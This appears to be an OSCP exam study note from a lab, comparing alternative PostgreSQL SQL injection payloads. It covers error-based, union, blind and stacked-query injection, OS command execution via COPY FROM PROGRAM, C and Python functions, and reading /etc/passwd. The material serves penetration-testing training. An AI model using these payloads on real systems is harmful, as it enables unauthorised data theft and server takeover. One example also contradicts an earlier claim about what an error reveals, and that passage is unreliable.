# Alternative Payloads - Multiple Paths to Same Goal
**OSCP Value**: When one payload fails, have alternatives ready!

---

## Alternative Methods for Error-Based Extraction

### Goal: Extract Database Version

**Method 1: CAST to INT** (what we used)
```sql
height=1' AND 1=CAST((SELECT version()) AS int)--
```
- ✅ Clean error message
- ✅ Works on all PostgreSQL versions
- ✅ Straightforward syntax

**Method 2: Direct Type Comparison**
```sql
height=1' AND 1=(SELECT version())--
```
- Compares INTEGER (1) with TEXT (version string)
- Error: `operator does not exist: integer = text`
- ❌ Less clear error message (doesn't show version)

**Method 3: Mathematical Operation**
```sql
height=1' AND 1/(SELECT LENGTH(version())-1000)=1--
```
- Division by negative number (if version string <1000 chars)
- Error includes version data
- ❌ Complex, unreliable

**Method 4: Array Index Out of Bounds**
```sql
height=1' AND (SELECT version())::int[1]=1--
```
- Tries to treat string as array
- Error: `cannot cast type text to integer[]`
- ❌ Doesn't extract data in error

**Recommendation**: Stick with Method 1 (CAST) for clarity and reliability.

---

## Alternative Row Aggregation Methods

### Goal: Extract All Table Names

**Method 1: string_agg()** (what we used)
```sql
SELECT string_agg(table_name, ',') FROM information_schema.tables WHERE table_schema='public'
```
- ✅ PostgreSQL-specific
- ✅ Clean CSV output
- ✅ Custom delimiter

**Method 2: array_agg() with array_to_string()**
```sql
SELECT array_to_string(array_agg(table_name), ',') FROM information_schema.tables WHERE table_schema='public'
```
- ✅ Slightly more verbose
- ✅ Array intermediate step (useful for advanced queries)
- Same output as Method 1

**Method 3: LIMIT/OFFSET Iteration** (old school)
```sql
-- Request 1
SELECT table_name FROM information_schema.tables WHERE table_schema='public' LIMIT 1 OFFSET 0

-- Request 2
SELECT table_name FROM information_schema.tables WHERE table_schema='public' LIMIT 1 OFFSET 1

-- Request 3...
```
- ❌ Multiple requests (slow)
- ✅ Works when aggregation fails
- ✅ Handles very large datasets (millions of rows)

**Method 4: Recursive CTE (Advanced)**
```sql
WITH RECURSIVE tables AS (
  SELECT table_name, ROW_NUMBER() OVER () as rn FROM information_schema.tables WHERE table_schema='public'
)
SELECT string_agg(table_name, ',') FROM tables
```
- ❌ Overly complex for simple task
- ✅ Useful for hierarchical data

**Recommendation**: Method 1 (string_agg) for simplicity. Method 3 (LIMIT/OFFSET) as fallback if aggregation blocked.

---

## Alternative RCE Methods in PostgreSQL

### Goal: Execute OS Commands

**Method 1: COPY FROM PROGRAM** (what we used)
```sql
DROP TABLE IF EXISTS cmd_output;
CREATE TABLE cmd_output(output text);
COPY cmd_output FROM PROGRAM 'id';
SELECT output FROM cmd_output;
```
- ✅ Built-in function (no extensions)
- ✅ Captures stdout
- ✅ PostgreSQL 9.3+
- ✅ Most reliable

**Method 2: CREATE FUNCTION with C Language** (UDF)
```sql
CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICT;
SELECT system('id > /tmp/output.txt');
```
- ❌ Requires CREATE FUNCTION privilege
- ❌ Must know libc.so path
- ❌ More complex
- ✅ Works on older PostgreSQL (pre-9.3)

**Method 3: Large Object Import** (lo_import)
```sql
SELECT lo_import('/etc/passwd', 12345);
SELECT encode(lo_get(12345), 'base64');
```
- ✅ File read (not command execution)
- ❌ Cannot execute commands
- ❌ Requires lo_* permission

**Method 4: plpythonu Extension**
```sql
CREATE OR REPLACE FUNCTION exec_shell(cmd text) RETURNS text AS $$
  import subprocess
  return subprocess.check_output(cmd, shell=True)
$$ LANGUAGE plpythonu;

SELECT exec_shell('id');
```
- ❌ Requires plpythonu extension installed
- ❌ Requires CREATE FUNCTION privilege
- ✅ Full Python capabilities (if available)

**Recommendation**: Method 1 (COPY FROM PROGRAM) unless PostgreSQL <9.3, then try Method 2 (UDF).

---

## Alternative File Read Methods

### Goal: Read /etc/passwd

**Method 1: pg_read_file()** (what we used)
```sql
SELECT pg_read_file('/etc/passwd', 0, 2000)
```
- ✅ Built-in function
- ✅ Offset/length control
- ✅ PostgreSQL 9.1+
- ✅ Requires superuser

**Method 2: COPY FROM PROGRAM with cat**
```sql
DROP TABLE IF EXISTS file_data;
CREATE TABLE file_data(line text);
COPY file_data FROM PROGRAM 'cat /etc/passwd';
SELECT string_agg(line, chr(10)) FROM file_data;
```
- ✅ Reads entire file
- ✅ Preserves line breaks
- ❌ More complex (multi-step)
- ✅ Can use shell features (grep, awk)

**Method 3: Large Object Import (lo_import)**
```sql
SELECT lo_import('/etc/passwd', 54321);
SELECT encode(lo_get(54321), 'escape') FROM pg_largeobject WHERE loid=54321;
```
- ❌ Complex syntax
- ❌ Requires lo_* functions enabled
- ✅ Handles binary files

**Method 4: pg_read_binary_file()**
```sql
SELECT encode(pg_read_binary_file('/etc/passwd'), 'escape')
```
- ✅ For binary files
- ❌ Overkill for text files
- ✅ Same privilege requirements as pg_read_file()

**Recommendation**: Method 1 (pg_read_file) for text files. Method 2 (COPY FROM PROGRAM) if you need shell processing.

---

## Alternative Injection Contexts

### Single-Statement vs Multi-Statement

**Single-Statement Injection** (SELECT context)
```sql
height=1' AND 1=CAST((SELECT version()) AS int)--
```
- Original query: `SELECT * FROM users WHERE height='...'`
- Injection point: Within WHERE clause
- ❌ Cannot create tables
- ❌ Cannot execute COPY
- ✅ Data extraction only

**Multi-Statement Injection** (stacked queries)
```sql
height=1'; DROP TABLE IF EXISTS cmd_output; CREATE TABLE cmd_output(output text); COPY cmd_output FROM PROGRAM 'id';--
```
- `;` terminates original SELECT
- Executes entirely new statements
- ✅ Full SQL flexibility
- ✅ RCE possible

**Union-Based Injection** (if columns match)
```sql
height=1' UNION SELECT version(), NULL, NULL, NULL, NULL, NULL--
```
- Requires knowing column count
- Requires compatible column types
- ✅ Data extraction in page output (if reflected)
- ❌ Didn't work here (no output reflection)

**Boolean-Based Blind Injection** (no errors, no output)
```sql
-- True condition (page normal)
height=1' AND 1=1--

-- False condition (page different)
height=1' AND 1=2--

-- Extract bit-by-bit
height=1' AND ASCII(SUBSTRING((SELECT version()),1,1))>100--
```
- ❌ Very slow (one bit per request)
- ✅ Works when no errors/output
- ❌ Not needed here (we have error-based)

**Time-Based Blind Injection** (no errors, no output, no page difference)
```sql
height=1' AND (SELECT CASE WHEN (SELECT version() LIKE 'PostgreSQL 13%') THEN pg_sleep(5) ELSE pg_sleep(0) END)--
```
- ❌ Extremely slow
- ✅ Works when absolutely nothing else works
- ❌ Not needed here

**Recommendation**: Use simplest method that works:
1. Error-based (fastest) ← We used this
2. Union-based (if output reflected)
3. Boolean-based (if no errors)
4. Time-based (last resort)

---

## Alternative String Concatenation

### Goal: Combine Multiple Columns

**Method 1: || Operator** (what we used)
```sql
SELECT weight::text || ',' || height::text || ',' || email FROM users
```
- ✅ PostgreSQL standard
- ✅ Clean syntax
- ✅ Requires type casting (::text)

**Method 2: CONCAT() Function**
```sql
SELECT CONCAT(weight, ',', height, ',', email) FROM users
```
- ✅ Automatic type conversion
- ✅ Cross-database compatible (MySQL, PostgreSQL)
- ✅ No type casting needed

**Method 3: format() Function**
```sql
SELECT format('%s,%s,%s', weight, height, email) FROM users
```
- ✅ printf-style formatting
- ✅ Complex formatting options
- ❌ More verbose for simple concatenation

**Method 4: String Aggregation with ARRAY**
```sql
SELECT array_to_string(ARRAY[weight::text, height::text, email], ',') FROM users
```
- ❌ Overly complex
- ✅ Useful for dynamic column lists

**Recommendation**: Method 1 (||) for PostgreSQL-specific scripts. Method 2 (CONCAT) for cross-database compatibility.

---

## Alternative Comment Styles

### Goal: Terminate Query

**Method 1: -- (Double Dash)** (what we used)
```sql
height=1' AND 1=CAST((SELECT version()) AS int)--
```
- ✅ SQL standard
- ✅ Comments out everything after
- ✅ Works in PostgreSQL, MySQL, MSSQL

**Method 2: #** (Hash)
```sql
height=1' AND 1=CAST((SELECT version()) AS int)#
```
- ✅ MySQL-specific
- ❌ Doesn't work in PostgreSQL
- ✅ Shorter syntax

**Method 3: /* */ (C-Style Block Comment)**
```sql
height=1' AND 1=CAST((SELECT version()) AS int)/*
```
- ✅ Multi-line comments
- ✅ Cross-database
- ❌ Requires closing */ (or don't close to comment rest)

**Method 4: ; (Semicolon - Statement Terminator)**
```sql
height=1' AND 1=CAST((SELECT version()) AS int);
```
- Terminates statement (doesn't comment)
- Remaining query executes (may cause errors)
- ❌ Less reliable than comments

**Method 5: NULL Byte** (rare)
```sql
height=1' AND 1=CAST((SELECT version()) AS int)%00
```
- ❌ Doesn't work in PostgreSQL
- ✅ Works in some older PHP/MySQL combinations
- ❌ Not reliable

**Recommendation**: Use `--` for reliability across all databases.

---

## 🎓 Key Takeaways

### Why Learn Alternative Payloads?

**Reason 1: Payload Adaptation**
- WAF blocks specific syntax → Try alternative
- Database quirks → Need different approach
- Character filtering → Use different operators

**Reason 2: Exam Versatility**
- OSCP boxes vary (old/new PostgreSQL versions)
- Some boxes block certain functions
- Need backup methods when primary fails

**Reason 3: Understanding Over Memorization**
- Multiple methods → deeper understanding
- Know WHY payload works, not just WHAT works
- Can troubleshoot when things fail

### Decision Tree for Choosing Payload

```
Need to extract data?
├─ Error messages visible?
│  ├─ YES → Error-based injection (CAST to int)
│  └─ NO → Boolean-based or time-based
│
├─ Need multi-row data?
│  ├─ Few rows (<10) → string_agg() all at once
│  └─ Many rows (>100) → LIMIT/OFFSET iteration
│
└─ Need to execute commands?
   ├─ PostgreSQL 9.3+? → COPY FROM PROGRAM
   └─ PostgreSQL <9.3? → UDF method
```

### Testing Alternative Payloads

**OSCP Exam Strategy**:
1. Start with simplest payload (error-based CAST)
2. If blocked, try alternative syntax (CONCAT vs ||)
3. If still blocked, change injection type (union-based)
4. Document what worked (and what didn't)

**Example scenario**:
```
Attempt 1: height=1' AND 1=CAST((SELECT version()) AS int)--
Result: Blocked by WAF

Attempt 2: height=1' AND 1=(SELECT version())
Result: Error message shows version (success!)

Lesson: Simpler payload bypassed WAF
```

---

## ⏱️ Time Investment in Alternatives

**During this lab**: We used primary methods (no need for alternatives).

**When alternatives matter**:
- WAF/IDS blocking: +5-10 minutes testing different syntax
- Unusual database config: +10-15 minutes researching
- Old PostgreSQL version: +15-20 minutes implementing UDF

**Value**: Knowing alternatives can save an entire box on exam day!
